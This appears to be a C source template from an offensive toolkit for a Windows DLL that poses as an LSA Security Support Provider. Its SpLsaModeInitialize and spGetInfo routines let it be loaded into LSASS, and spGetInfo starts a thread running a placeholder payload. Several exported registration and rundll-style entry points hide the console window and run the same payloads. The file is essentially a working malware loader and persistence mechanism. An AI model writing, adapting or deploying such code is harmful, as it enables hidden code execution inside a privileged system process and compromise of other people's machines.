// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#define WINVER 0x0501
#define _WIN32_WINNT 0x0501

#define NOWH
#define NOMB
#define NOGDI
#define NOMSG
#define NONLS
#define NOMCX
#define NOIME
#define NOHELP
#define NOCOMM
#define NOICONS
#define NOCRYPT
#define NOKANJI
#define NOSOUND
#define NOCOLOR
#define NOMENUS
#define NOCTLMGR
#define NOMINMAX
#define NOSCROLL
#define NODRAWTEXT
#define NOMETAFILE
#define NOPROFILER
#define NOKEYSTATES
#define NORASTEROPS
#define NOCLIPBOARD
#define NOWINSTYLES
#define NOSYSMETRICS
#define NOWINOFFSETS
#define NOSHOWWINDOW
#define NOTEXTMETRIC
#define NOSYSCOMMANDS
#define NOGDICAPMASKS
#define NOWINMESSAGES
#define NODEFERWINDOWPOS
#define NOVIRTUALKEYCODES
#define WIN32_LEAN_AND_MEAN

#define EXPORT __declspec(dllexport)

#include <winsock.h>
#include <windows.h>
#include <sspi.h>
#include <ntsecapi.h>
#include <ntsecpkg.h>
#include <winternl.h>

#include "flurry.h"

NTSTATUS NTAPI spShutDown();
NTSTATUS NTAPI spGetInfo(PSecPkgInfoW);
NTSTATUS NTAPI spInitialize(ULONG_PTR, PSECPKG_PARAMETERS, PLSA_SECPKG_FUNCTION_TABLE);
NTSTATUS NTAPI spAcceptCredentials(SECURITY_LOGON_TYPE, PUNICODE_STRING, PSECPKG_PRIMARY_CRED, PSECPKG_SUPPLEMENTAL_CRED);

static SECPKG_FUNCTION_TABLE secPkgFunctionTable[] = {{
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    spInitialize, spShutDown, spGetInfo, spAcceptCredentials,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL
}};

DWORD $thread() {
    Sleep(1000);
    $export();
    return 0;
}

EXPORT HRESULT WINAPI VoidFunc() {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, 0);
    }
    $secondary();
}
EXPORT HRESULT WINAPI DllRegisterServer() {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, 0);
    }
    $export();
}
EXPORT HRESULT WINAPI DllUnregisterServer() {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, 0);
    }
    $export();
}
EXPORT HRESULT WINAPI DllInstall(BOOL b, PCWSTR i) {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, 0);
    }
    $export();
}

EXPORT void $funcname(HWND h, HINSTANCE i, LPSTR a, int s) {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, 0);
    }
    $secondary();
}

EXPORT BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID args) {
    return TRUE;
}

NTSTATUS NTAPI spShutDown() {
	return 0;
}
NTSTATUS NTAPI spGetInfo(PSecPkgInfoW i)  {
    i->wVersion = 1;
    i->cbMaxToken = 0;
    i->wRPCID = SECPKG_ID_NONE;
    i->Name = L"$package_name";
    i->Comment = L"$package_comment";
    i->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)$thread, NULL, 0, NULL);
    return 0;
}
NTSTATUS NTAPI spInitialize(ULONG_PTR p, PSECPKG_PARAMETERS a, PLSA_SECPKG_FUNCTION_TABLE f) {
	return 0;
}
NTSTATUS NTAPI spAcceptCredentials(SECURITY_LOGON_TYPE l, PUNICODE_STRING a, PSECPKG_PRIMARY_CRED p, PSECPKG_SUPPLEMENTAL_CRED s) {
	return 0;
}

EXPORT NTSTATUS NTAPI SpLsaModeInitialize(ULONG l, PULONG v, PSECPKG_FUNCTION_TABLE *t, PULONG c) {
	*v = SECPKG_INTERFACE_VERSION;
	*t = secPkgFunctionTable;
	*c = ARRAYSIZE(secPkgFunctionTable);
	return 0;
}
